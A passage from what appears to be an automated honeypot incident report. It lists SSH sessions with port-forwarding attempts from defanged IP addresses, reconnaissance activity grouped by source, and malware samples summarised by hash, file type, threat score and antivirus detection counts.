| **First Seen** | 2026-09-01 18:02 |
| **Last Seen** | 2026-09-01 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:02:28` | `cowrie.session.connect` |
| `2026-09-01 18:02:28` | `cowrie.client.version` |
| `2026-09-01 18:02:28` | `cowrie.client.kex` |
| `2026-09-01 18:02:29` | `cowrie.login.success` |
| `2026-09-01 18:02:29` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:02:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:02:29` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d955c8a6a478

| Field | Detail |
|---|---|
| **Source IP** | `27.79.5[.]21` |
| **First Seen** | 2026-09-01 18:03 |
| **Last Seen** | 2026-09-01 18:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:03:57` | `cowrie.session.connect` |
| `2026-09-01 18:03:58` | `cowrie.client.version` |
| `2026-09-01 18:03:58` | `cowrie.client.kex` |
| `2026-09-01 18:03:59` | `cowrie.login.success` |
| `2026-09-01 18:04:00` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:04:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:04:00` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.5[.]21` to AbuseIPDB if not already reported
- [ ] Block `27.79.5[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0a03859f181

| Field | Detail |
|---|---|
| **Source IP** | `27.79.5[.]21` |
| **First Seen** | 2026-09-01 18:06 |
| **Last Seen** | 2026-09-01 18:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:06:49` | `cowrie.session.connect` |
| `2026-09-01 18:06:49` | `cowrie.client.version` |
| `2026-09-01 18:06:50` | `cowrie.client.kex` |
| `2026-09-01 18:06:53` | `cowrie.login.success` |
| `2026-09-01 18:06:54` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:06:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:06:56` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.5[.]21` to AbuseIPDB if not already reported
- [ ] Block `27.79.5[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c6ac4968e0e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 18:08 |
| **Last Seen** | 2026-09-01 18:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:08:38` | `cowrie.session.connect` |
| `2026-09-01 18:08:38` | `cowrie.client.version` |
| `2026-09-01 18:08:38` | `cowrie.client.kex` |
| `2026-09-01 18:08:39` | `cowrie.login.success` |
| `2026-09-01 18:08:39` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:08:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:08:40` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25a8f8f7537a

| Field | Detail |
|---|---|
| **Source IP** | `27.79.5[.]21` |
| **First Seen** | 2026-09-01 18:11 |
| **Last Seen** | 2026-09-01 18:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:11:31` | `cowrie.session.connect` |
| `2026-09-01 18:11:31` | `cowrie.client.version` |
| `2026-09-01 18:11:31` | `cowrie.client.kex` |
| `2026-09-01 18:11:33` | `cowrie.login.success` |
| `2026-09-01 18:11:33` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:11:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:11:34` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.5[.]21` to AbuseIPDB if not already reported
- [ ] Block `27.79.5[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-412517dc0e82

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 18:13 |
| **Last Seen** | 2026-09-01 18:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:13:39` | `cowrie.session.connect` |
| `2026-09-01 18:13:39` | `cowrie.client.version` |
| `2026-09-01 18:13:40` | `cowrie.client.kex` |
| `2026-09-01 18:13:41` | `cowrie.login.success` |
| `2026-09-01 18:13:41` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:13:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:13:41` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d49e55d30a31

| Field | Detail |
|---|---|
| **Source IP** | `27.79.5[.]21` |
| **First Seen** | 2026-09-01 18:15 |
| **Last Seen** | 2026-09-01 18:15 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:15:16` | `cowrie.session.connect` |
| `2026-09-01 18:15:16` | `cowrie.client.version` |
| `2026-09-01 18:15:16` | `cowrie.client.kex` |
| `2026-09-01 18:15:18` | `cowrie.login.success` |
| `2026-09-01 18:15:18` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:15:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:15:27` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.5[.]21` to AbuseIPDB if not already reported
- [ ] Block `27.79.5[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-461b86de365b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 18:18 |
| **Last Seen** | 2026-09-01 18:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:18:38` | `cowrie.session.connect` |
| `2026-09-01 18:18:38` | `cowrie.client.version` |
| `2026-09-01 18:18:38` | `cowrie.client.kex` |
| `2026-09-01 18:18:39` | `cowrie.login.success` |
| `2026-09-01 18:18:39` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:18:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:18:39` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:18:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f2ead4aa1d7

| Field | Detail |
|---|---|
| **Source IP** | `27.79.5[.]21` |
| **First Seen** | 2026-09-01 18:18 |
| **Last Seen** | 2026-09-01 18:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:18:49` | `cowrie.session.connect` |
| `2026-09-01 18:18:49` | `cowrie.client.version` |
| `2026-09-01 18:18:50` | `cowrie.client.kex` |
| `2026-09-01 18:18:51` | `cowrie.login.success` |
| `2026-09-01 18:18:52` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:18:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:18:55` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:18:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.5[.]21` to AbuseIPDB if not already reported
- [ ] Block `27.79.5[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-957cb726b0bb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 18:25 |
| **Last Seen** | 2026-09-01 18:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:25:01` | `cowrie.session.connect` |
| `2026-09-01 18:25:01` | `cowrie.client.version` |
| `2026-09-01 18:25:01` | `cowrie.client.kex` |
| `2026-09-01 18:25:03` | `cowrie.login.success` |
| `2026-09-01 18:25:03` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:25:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:25:03` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:25:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccde5d7ba4c3

| Field | Detail |
|---|---|
| **Source IP** | `27.79.5[.]21` |
| **First Seen** | 2026-09-01 18:26 |
| **Last Seen** | 2026-09-01 18:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:26:21` | `cowrie.session.connect` |
| `2026-09-01 18:26:21` | `cowrie.client.version` |
| `2026-09-01 18:26:21` | `cowrie.client.kex` |
| `2026-09-01 18:26:29` | `cowrie.login.success` |
| `2026-09-01 18:26:30` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:26:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:26:32` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:26:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.5[.]21` to AbuseIPDB if not already reported
- [ ] Block `27.79.5[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b380274f43c4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 18:29 |
| **Last Seen** | 2026-09-01 18:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:29:02` | `cowrie.session.connect` |
| `2026-09-01 18:29:02` | `cowrie.client.version` |
| `2026-09-01 18:29:02` | `cowrie.client.kex` |
| `2026-09-01 18:29:03` | `cowrie.login.success` |
| `2026-09-01 18:29:03` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:29:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:29:04` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:29:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a00f41a8b8a

| Field | Detail |
|---|---|
| **Source IP** | `27.79.5[.]21` |
| **First Seen** | 2026-09-01 18:33 |
| **Last Seen** | 2026-09-01 18:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:33:59` | `cowrie.session.connect` |
| `2026-09-01 18:33:59` | `cowrie.client.version` |
| `2026-09-01 18:34:00` | `cowrie.client.kex` |
| `2026-09-01 18:34:00` | `cowrie.login.success` |
| `2026-09-01 18:34:01` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:34:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:34:01` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.5[.]21` to AbuseIPDB if not already reported
- [ ] Block `27.79.5[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-729eaf2fb858

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 18:36 |
| **Last Seen** | 2026-09-01 18:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:36:13` | `cowrie.session.connect` |
| `2026-09-01 18:36:13` | `cowrie.client.version` |
| `2026-09-01 18:36:13` | `cowrie.client.kex` |
| `2026-09-01 18:36:14` | `cowrie.login.success` |
| `2026-09-01 18:36:14` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:36:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:36:14` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:36:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-269d36016222

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 18:39 |
| **Last Seen** | 2026-09-01 18:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:39:02` | `cowrie.session.connect` |
| `2026-09-01 18:39:02` | `cowrie.client.version` |
| `2026-09-01 18:39:02` | `cowrie.client.kex` |
| `2026-09-01 18:39:03` | `cowrie.login.success` |
| `2026-09-01 18:39:04` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:39:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:39:04` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:39:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ac117f28da0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 18:47 |
| **Last Seen** | 2026-09-01 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:47:14` | `cowrie.session.connect` |
| `2026-09-01 18:47:14` | `cowrie.client.version` |
| `2026-09-01 18:47:14` | `cowrie.client.kex` |
| `2026-09-01 18:47:15` | `cowrie.login.success` |
| `2026-09-01 18:47:15` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:47:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:47:16` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87ce24254c64

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 18:48 |
| **Last Seen** | 2026-09-01 18:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:48:41` | `cowrie.session.connect` |
| `2026-09-01 18:48:41` | `cowrie.client.version` |
| `2026-09-01 18:48:41` | `cowrie.client.kex` |
| `2026-09-01 18:48:42` | `cowrie.login.success` |
| `2026-09-01 18:48:42` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:48:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:48:43` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **9** | 2026-09-01 15:12 | 2026-09-01 18:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `198.163.195[.]119` | **3** | 2026-09-01 15:28 | 2026-09-01 15:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.190.126[.]161` | **2** | 2026-09-01 16:35 | 2026-09-01 16:39 | 4m | 0 | `T1592` | 🟢 LOW |
| `188.191.69[.]40` | **2** | 2026-09-01 16:06 | 2026-09-01 16:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.26.172[.]97` | **2** | 2026-09-01 16:40 | 2026-09-01 16:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.109.38[.]230` | **2** | 2026-09-01 15:19 | 2026-09-01 15:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.131.220[.]121` | **2** | 2026-09-01 15:53 | 2026-09-01 15:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `125.122.37[.]247` | 1 | 2026-09-01 16:34 | 2026-09-01 16:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `138.68.63[.]15` | 1 | 2026-09-01 17:18 | 2026-09-01 17:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `159.223.123[.]239` | 1 | 2026-09-01 17:02 | 2026-09-01 17:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-09-01 18:44 | 2026-09-01 18:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.96.95[.]66` | 1 | 2026-09-01 17:51 | 2026-09-01 17:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]146` | 1 | 2026-09-01 17:29 | 2026-09-01 17:29 | 2s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]183` | 1 | 2026-09-01 14:55 | 2026-09-01 14:55 | 2s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-09-01 17:39 | 2026-09-01 17:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]80` | 1 | 2026-09-01 15:20 | 2026-09-01 15:20 | 10s | 0 | `T1592` | 🟢 LOW |
| `223.84.195[.]56` | 1 | 2026-09-01 16:54 | 2026-09-01 16:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.79.5[.]21` | 1 | 2026-09-01 18:22 | 2026-09-01 18:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.20.236[.]52` | 1 | 2026-09-01 15:42 | 2026-09-01 15:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-09-01 16:03 | 2026-09-01 16:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-09-01 16:48 | 2026-09-01 16:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]176` | 1 | 2026-09-01 18:50 | 2026-09-01 18:50 | 16s | 0 | `T1592` | 🟢 LOW |
| `70.93.195[.]169` | 1 | 2026-09-01 15:22 | 2026-09-01 15:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-09-01 18:25 | 2026-09-01 18:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]94` | 1 | 2026-09-01 17:43 | 2026-09-01 17:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-09-01 15:08 | 2026-09-01 15:08 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
